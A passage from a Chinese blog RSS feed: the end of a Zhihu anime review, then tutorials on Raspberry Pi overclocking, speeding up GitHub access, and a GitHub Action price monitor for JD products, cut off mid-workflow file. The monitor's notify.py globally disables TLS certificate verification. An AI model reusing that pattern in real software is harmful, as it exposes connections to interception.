data-private-watermark-src=\"v2-2bffbcfaf893f256c5eed1b09663046e\"></p>\n<p>只是这种手法，讲究一个一击脱离。如果用来展现压抑了一整集后，终于打破了灰暗世界的镜面，从原本黯淡的生活中走出，那是极好的，第一次看到路边的风景染上缤纷的颜色时，我的内心也是被触动了的。但问题在于，你也别十二集全这招啊，在灰暗和彩色的世界进进出出，小熊的生活真是容易褪色啊。</p>\n<p><b>古典乐</b></p>\n<p>日常生活细节的原声采样值得表扬，但配乐方面，大量的古典乐又显得喧宾夺主了。亲和力强是古典乐的优势，能够应用于绝大多数场景，但劣势同样明显。</p>\n<p>听到立山秋航木吉他和笛子打底的民乐，一下子就能想到本栖湖的美景，听到加藤达也、藤泽庆昌悠扬的管弦乐，一下子就能“哇嘎里马斯达”，听到日本贝多芬磅礴的管弦乐电子乐混搭，一下子就能“燃起来了”，配乐是决定观众对一部作品的“印象”的隐性的关键因素。很多日本作曲家不仅旋律写得好，编曲水平也很高，擅长在曲子里塞一堆乐器还能协调得很好，大大提高了听感。相比之下，多数为单一配器的古典乐实在是太单薄又缺乏特点了，然而本田小狼使用的古典乐多达15、6首，乃至就算其中混有几首石川智久和ZAQ的配乐，也完全没有感觉。一季度看下来，愣是没有一首抓住我耳朵的配乐，脑子里全是德彪西、德彪西、德彪西、李斯特、肖邦……</p>\n<p><b>同ポ</b></p>\n<p>同ポ截取了世界的一个角落不同时间的风景，展现了时间流转，四时之景不同。</p>\n<p>相比之下，同ポ除了用得多也没啥毛病可挑了，而且不得不说草薙的美术是好，一些固定机位空镜头反而能发扬优点。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c237f6b84d05d06c1b0f83dc18797bbd_720w.png?rss\" data-caption=\"这个机位尤其多，后面还有雪景\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"540\" data-watermark=\"original\" data-original-src=\"v2-c237f6b84d05d06c1b0f83dc18797bbd\" data-watermark-src=\"v2-6585d1b85f523800955f152b4ffc8cae\" data-private-watermark-src=\"v2-2e30b2ae15553b2d39feee7cb28fb5f7\"></p>\n<p>演出手段过于贫乏，演出意图又显而易见，玩不出新花样后进入了枯燥模式，如果只是无聊也罢，偏偏在于动画对女主角小熊的塑造又出现了问题（其实当我要去讨论人物塑造和故事逻辑的时候，这部作品对我而言已经是失败的了）。</p>\n<p>不止是大家都在吐槽的11集的荒诞营救，前几集就有所体现了，比如ep9收到椎子父亲赠送的贵重毛衣后理所当然地推给椎子去改，ep10打雪仗时用摩托车降维打击，如果到这还能勉强面不改色地说一句“小熊的性格真是糟糕啊“，那到ep11耳光扇醒落水椎子宣扬“小狼精神”的时候就真像邪教组织出来的，让我彻底蚌埠住了。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-f37d8bc14f8995414ac7c4fbac0dc87c_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-f37d8bc14f8995414ac7c4fbac0dc87c\" data-watermark-src=\"v2-0a63c24fef84284fe7377ebe7d05f85d\" data-private-watermark-src=\"v2-61de3647c230ef2257fa69f105f7f5c1\"></p>\n<p>我能理解制作组想塑造一个文静、孤独、不善表达情绪的少女小熊，但我看到的是一个无力、缺乏常识、唯cub至上的小熊，这其中的落差让摩托车的机油味盖过了少女之间的人情味，离温暖可爱的日常越来越远。</p>\n<p>很可惜的作品。</p>\n<p>————————————————————————————————————————</p>\n<p>我记得19年当初《卡罗尔和星期二》刚上时， <a class=\"member_mention\" href=\"http://www.zhihu.com/people/ef23b97680f75e827541394b25c958e3\" data-hash=\"ef23b97680f75e827541394b25c958e3\" data-hovercard=\"p$b$ef23b97680f75e827541394b25c958e3\">@海月的虚空秋凉的时鸟</a> 说：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c185bc218ed7f17a2801f9013f6f4011_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1052\" data-rawheight=\"119\" data-watermark=\"original\" data-original-src=\"v2-c185bc218ed7f17a2801f9013f6f4011\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>《本田小狼与我》开播时， <a class=\"member_mention\" href=\"http://www.zhihu.com/people/ef23b97680f75e827541394b25c958e3\" data-hash=\"ef23b97680f75e827541394b25c958e3\" data-hovercard=\"p$b$ef23b97680f75e827541394b25c958e3\">@海月的虚空秋凉的时鸟</a> 又说：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7c667c73a9482429f41a795a0d7e6607_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"855\" data-rawheight=\"94\" data-watermark=\"original\" data-original-src=\"v2-7c667c73a9482429f41a795a0d7e6607\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>不禁想问，真的成功了吗？ =。=</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fb8b2f8049f68f5be92e427ec0a61eeb_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"158\" data-rawheight=\"159\" data-watermark=\"original\" data-original-src=\"v2-fb8b2f8049f68f5be92e427ec0a61eeb\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/woshilaodingdang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">老叮当</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/453183108/answer/1988984965?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">47 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/468802426?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价2021年7月动画《见面之后5秒开始战斗》第一集？</a><br><a href=\"http://www.zhihu.com/question/466227677?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">怎么评价动画《致不灭的你》？</a><br>\n","link":"http://www.zhihu.com/question/453183108/answer/1988984965?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span 